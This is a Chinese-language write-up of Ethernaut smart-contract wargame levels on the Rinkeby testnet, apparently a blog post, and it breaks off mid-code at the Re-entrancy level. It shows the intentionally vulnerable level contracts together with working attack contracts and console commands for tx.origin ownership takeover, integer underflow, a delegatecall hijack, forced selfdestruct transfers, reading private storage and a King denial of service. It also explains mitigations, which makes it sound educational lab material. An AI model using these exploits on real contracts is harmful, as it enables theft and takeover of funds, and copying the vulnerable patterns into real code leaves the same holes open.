<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">abstract contract Telephone &#123;</span><br><span class="line">  function changeOwner(address _owner) virtual public ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Telephone telephone = Telephone(0x4077264AbFd7Dc4c88E78fdD1cf440cfa1994221);</span><br><span class="line"></span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        telephone.changeOwner(0x169C51C027B82267387429C0E8b47C6879A4Fb5d);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部署该合约，调用<code>exploit()</code>即可</p>
<p><a target="_blank" rel="noopener" href="https://rinkeby.etherscan.io/address/0x4077264AbFd7Dc4c88E78fdD1cf440cfa1994221#internaltx">Telephone</a>：</p>
<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204220749115.png" class="" title="image-20211204220749115">

<p><a target="_blank" rel="noopener" href="https://rinkeby.etherscan.io/address/0x289d053e0f2A18a6A43a7bC0bE2B8160928E4c36">Attack</a>：</p>
<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204220851923.png" class="" title="image-20211204220851923">

<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204220904318.png" class="" title="image-20211204220904318">



<p>将<code>tx.origin</code>与<code>msg.sender</code>混淆可能会导致类似于<a target="_blank" rel="noopener" href="https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/">Ethereum Wallet  Frontier</a>的钓鱼攻击</p>
<h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>The goal of this level is for you to hack the basic token contract below.</p>
<p>You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.</p>
<p> Things that might help:</p>
<ul>
<li>What is an odometer?</li>
</ul>
<h3 id="Sources-4"><a href="#Sources-4" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h3><p>整数溢出问题，<code>uint</code> 实际上是 <code>uint256</code>， 一个256位的无符号整数，即必然大于等于0。两个无符号整数相减，结果依然是无符号整数，<code>balances[msg.sender] - _value &gt;= 0</code>恒成立，可以向其他地址转账任意金额，也可以通过整数下溢使自己账户得到很大金额</p>
<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204225829991.png" class="" title="image-20211204225829991">



<p>溢出问题在solidity中很常见，为了避免这类问题可以使用以下语句进行检查</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(a + c &gt; a) &#123;</span><br><span class="line">  a = a + c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也可以使用OpenZeppelin的SafeMath库，该库自动检查所有数学运算符中的溢出，如果出现溢出，代码将revert</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = a.add(c);</span><br></pre></td></tr></table></figure>



<h2 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h2><p>The goal of this level is for you to claim ownership of the instance you are given.</p>
<p> Things that might help</p>
<ul>
<li>Look into Solidity’s documentation on the <code>delegatecall</code> low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.</li>
<li>Fallback methods</li>
<li>Method ids</li>
</ul>
<h3 id="Sources-5"><a href="#Sources-5" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) public &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) public &#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h3><p>目标是成为合约的<code>owner</code>，准确来说是成为<code>Delegation</code>合约的<code>owner</code>，对于<code>Delegate</code>而言，直接调用其<code>pwn()</code>函数即可，从<a target="_blank" rel="noopener" href="https://github.dev/OpenZeppelin/ethernaut">Ethernaut靶场源码</a>也可以看到给出的关卡实例是<code>Delegation</code>合约</p>
<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205151447286.png" class="" title="image-20211205151447286">

<p>想获取<code>Delegate</code>地址可以用web3的<a target="_blank" rel="noopener" href="https://learnblockchain.cn/docs/web3.js/web3-eth.html#getstorageat">getStorageAt</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="number">1</span> ,<span class="keyword">function</span>(<span class="params">err,res</span>)&#123;<span class="variable language_">console</span>.<span class="title function_">info</span>(err,res)&#125;)</span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries">Delegatecall &#x2F; Callcode and Libraries</a></p>
<blockquote>
<p>There exists a special variant of a message call, named <strong>delegatecall</strong> which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and <code>msg.sender</code> and <code>msg.value</code> do not change their values.<br>This means that a contract can dynamically load code from a different address at runtime. Storage, current address and balance still refer to the calling contract, only the code is taken from the called address.<br>This makes it possible to implement the “library” feature in Solidity: Reusable library code that can be applied to a contract’s storage, e.g. in order to implement a complex data structure.</p>
</blockquote>
<p>参考<a target="_blank" rel="noopener" href="https://paper.seebug.org/633/">以太坊 Solidity 合约 call 函数簇滥用导致的安全风险</a>分析，使用<code>delegatecall</code>调用后内置变量<code>msg</code>的值不会修改为调用者，但执行环境为调用者的运行环境，也就是说在<code>Delegation</code>中执行<code>&lt;Delegate.address&gt;.delegatecall(bytes4(keccak256(&quot;pwn()&quot;)));</code>就可将<code>Delegation</code>的<code>owner</code>设为自己，注意这里并不是因为变量名都为<code>owner</code>所以可以修改，而是在两个合约中，<code>owner</code>都处于相同的槽位，详见<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/55662982">Solidity的delegatecall()对状态变量存储的影响</a></p>
<p><code>fallback()</code>函数的触发条件：</p>
<ul>
<li>合约中没有相应的函数匹配（调用的函数不存在）</li>
<li>合约收到别人发送的Ether且没有数据，此时 <code>fallback()</code> 需要带有 <code>payable</code> 标记，否则revert</li>
</ul>
<p>综上，发送交易触发 <code>Delegation</code> 合约的 <code>fallback()</code> 函数，同时设置 <code>data</code> 为 <code>pwn</code> 函数的标识符即可（<code>data</code> 头4个byte是被调用方法的签名哈希，即 <code>bytes4(keccak256(&quot;func&quot;))</code> , remix 里调用函数，实际是向合约账户地址发送了<code>msg.data[0:4]</code> 为函数签名哈希的一笔交易）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">data</span>:web3.<span class="property">utils</span>.<span class="title function_">sha3</span>(<span class="string">&quot;pwn()&quot;</span>).<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">10</span>)&#125;)</span><br></pre></td></tr></table></figure>

<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205163154978.png" class="" title="image-20211205163154978">



<p>使用web3：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Web3</span> = <span class="built_in">require</span>(<span class="string">&#x27;web3&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> rpcURL = <span class="string">&#x27;***&#x27;</span> <span class="comment">// RPC URL</span></span><br><span class="line"><span class="keyword">const</span> web3 = <span class="keyword">new</span> <span class="title class_">Web3</span>(rpcURL)</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Tx</span> = <span class="built_in">require</span>(<span class="string">&#x27;ethereumjs-tx&#x27;</span>).<span class="property">Transaction</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> contractAddress = <span class="string">&quot;0x78E07752555D94fFa95cC228E15627CA3804A3c8&quot;</span> <span class="comment">//合约地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> account = <span class="string">&#x27;0xdd7587F01659246E942148b70F2bCeD28aB8bC23&#x27;</span></span><br><span class="line"><span class="keyword">const</span> privateKey = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;***&#x27;</span>,<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getTransactionCount</span>(account, <span class="function">(<span class="params">err, txCount</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> txObject = &#123;</span><br><span class="line">        <span class="attr">nonce</span>:    web3.<span class="property">utils</span>.<span class="title function_">toHex</span>(txCount),</span><br><span class="line">        <span class="attr">gasLimit</span>: web3.<span class="property">utils</span>.<span class="title function_">toHex</span>(<span class="number">8000000</span>),</span><br><span class="line">        <span class="attr">gasPrice</span>: web3.<span class="property">utils</span>.<span class="title function_">toHex</span>(web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>)),</span><br><span class="line">        <span class="attr">to</span>: contractAddress,</span><br><span class="line">        <span class="attr">data</span>: <span class="number">0xdd365b8b</span>, <span class="comment">//bytes4(keccak256(&quot;pwn()&quot;))</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> tx = <span class="keyword">new</span> <span class="title class_">Tx</span>(txObject,&#123; <span class="attr">chain</span>: <span class="string">&#x27;rinkeby&#x27;</span> &#125;)</span><br><span class="line">    tx.<span class="title function_">sign</span>(privateKey)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> serializedTx = tx.<span class="title function_">serialize</span>()</span><br><span class="line">    <span class="keyword">const</span> raw = <span class="string">&#x27;0x&#x27;</span> + serializedTx.<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    web3.<span class="property">eth</span>.<span class="title function_">sendSignedTransaction</span>(raw, <span class="function">(<span class="params">err, txHash</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;err:&#x27;</span>, err)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;txHash:&#x27;</span>, txHash)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<p>一个实际案例<a target="_blank" rel="noopener" href="https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7/">The Parity Wallet Hack Explained</a></p>
<h2 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h2><p>Some contracts will simply not take your money <code>¯\_(ツ)_/¯</code></p>
<p>The goal of this level is to make the balance of the contract greater than zero.</p>
<p> Things that might help:</p>
<ul>
<li>Fallback methods</li>
<li>Sometimes the best way to attack a contract is with another contract.</li>
<li>See the Help page above, section “Beyond the console”</li>
</ul>
<h3 id="Sources-6"><a href="#Sources-6" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;/*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">  /~____  =ø= /</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*/&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Solution-6"><a href="#Solution-6" class="headerlink" title="Solution"></a>Solution</h3><p>需要让合约的balance大于0。尝试直接向合约转账的话会被revert（没有<code>receive()</code>也没有<code>payable</code>修饰的<code>fallback()</code>函数）</p>
<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205134428192.png" class="" title="image-20211205134428192">



<p>不过可以通过<code>selfdestruct</code>强行转账</p>
<blockquote>
<p><code>selfdestruct(address payable recipient)</code>: destroy the current contract, sending its funds to the given address</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract ForceAttack &#123;</span><br><span class="line"></span><br><span class="line">  constructor() public payable &#123;&#125;</span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function attack(address payable target) public &#123;</span><br><span class="line">    selfdestruct(target);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205140506104.png" class="" title="image-20211205140506104">

<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205140250560.png" class="" title="image-20211205140250560">



<h2 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h2><p>Unlock the vault to pass the level!</p>
<h3 id="Sources-7"><a href="#Sources-7" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32 _password) public &#123;</span><br><span class="line">    locked = true;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    if (password == _password) &#123;</span><br><span class="line">      locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Solution-7"><a href="#Solution-7" class="headerlink" title="Solution"></a>Solution</h3><p><code>password</code>被设置为private，无法被其他合约直接访问，但是区块链上的所有信息是公开的，可以借助web3的<a target="_blank" rel="noopener" href="https://learnblockchain.cn/docs/web3.js/web3-eth.html#getstorageat">getStorageAt</a>来访问</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="number">1</span> ,<span class="keyword">function</span>(<span class="params">err,res</span>)&#123;<span class="variable language_">console</span>.<span class="title function_">info</span>(err,web3.<span class="property">utils</span>.<span class="title function_">toAscii</span>(res))&#125;)</span><br></pre></td></tr></table></figure>

<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205143345839.png" class="" title="image-20211205143345839">

<p>密码是<code>A very strong secret password :)</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">unlock</span>(web3.<span class="property">utils</span>.<span class="title function_">asciiToHex</span>(<span class="string">&quot;A very strong secret password :)&quot;</span>))</span><br></pre></td></tr></table></figure>

<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205144246292.png" class="" title="image-20211205144246292">



<p>为了确保数据是私有的，需要在将其放入区块链之前对其进行加密。在这种情况下，解密密钥永远不应该在链上发送，因为它将对任何寻找它的人可见。<a target="_blank" rel="noopener" href="https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/">zk-SNARKs</a>提供了一种无需公开参数确定某人是否拥有秘密参数的方法</p>
<h2 id="King"><a href="#King" class="headerlink" title="King"></a>King</h2><p>The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD</p>
<p>Such a fun game. Your goal is to break it.</p>
<p>When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.</p>
<h3 id="Sources-8"><a href="#Sources-8" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address payable king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public payable &#123;</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address payable) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution-8"><a href="#Solution-8" class="headerlink" title="Solution"></a>Solution</h3><p>转账金额大于当前<code>prize</code>即可成为<code>king</code>，然而如下<a target="_blank" rel="noopener" href="https://github.dev/OpenZeppelin/ethernaut">代码</a>可知，提交<code>instance</code>时，题目作为<code>owner</code>会重新夺回<code>king</code>，通关条件是阻止题目重新成为<code>king</code></p>
<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205214625649.png" class="" title="image-20211205214625649">

<p>Solidity的三种转账方式：</p>
<ul>
<li><p><code>&lt;address payable&gt;.transfer(uint256 amount)</code></p>
<p>当发送失败时会 <code>throw</code> ，回滚状态</p>
<p>只会传递部分  <code>Gas</code>  供调用，防止重入</p>
</li>
<li><p><code>&lt;address payable&gt;.send(uint256 amount) returns (bool)</code></p>
<p>当发送失败时会返回 <code>false</code><br>只会传递部分 <code>Gas</code> 供调用，防止重入</p>
</li>
<li><p><code>&lt;address payable&gt;.call.value()()</code></p>
<p>当发送失败时会返回 <code>false</code><br>传递所有可用 <code>Gas</code> 供调用，不能有效防止重入</p>
</li>
</ul>
<p>题目通过<code>king.transfer(msg.value);</code>向之前的<code>king</code>转账，<code>transfer</code>这种方式失败会<code>throws</code> 错误，无法继续执行下面的代码，所以只要让转账时出错，就不会产生新的<code>king</code>。另外我们知道，如果向一个没有 <code>fallback</code> 函数的合约，或 <code>fallback</code> 不带 <code>payable</code> 的合约发送 <code>Ether</code>，则会报错。</p>
<p>先看一下当前的<code>prize</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="title function_">fromWei</span>((<span class="keyword">await</span> contract.<span class="title function_">prize</span>()))</span><br></pre></td></tr></table></figure>

<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205222034688.png" class="" title="image-20211205222034688">

<p>部署以下合约，调用<code>doYourThing</code>函数，传入实例地址和1.001 Ether</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract KingAttack &#123;</span><br><span class="line"></span><br><span class="line">  function doYourThing(address _target) public payable &#123;</span><br><span class="line">     (bool result,) = _target.call.value(msg.value)(&quot;&quot;);</span><br><span class="line">     if(!result) revert();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // OMG NO PAYABLE FALLBACK!!</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205224256248.png" class="" title="image-20211205224256248">

<p>可以看到<code>king</code>已经变成了刚部署的合约的地址</p>
<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205224553899.png" class="" title="image-20211205224553899">

<p>提交实例后，<code>king</code>依然不变</p>
<h2 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h2><p>The goal of this level is for you to steal all the funds from the contract.</p>
<p> Things that might help:</p>
<ul>
<li>Untrusted contracts can execute code where you least expect it.</li>
<li>Fallback methods</li>
<li>Throw&#x2F;revert bubbling</li>
<li>Sometimes the best way to attack a contract is with another contract.</li>
<li>See the Help page above, section “Beyond the console”</li>
</ul>
<h3 id="Sources-9"><a href="#Sources-9" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span 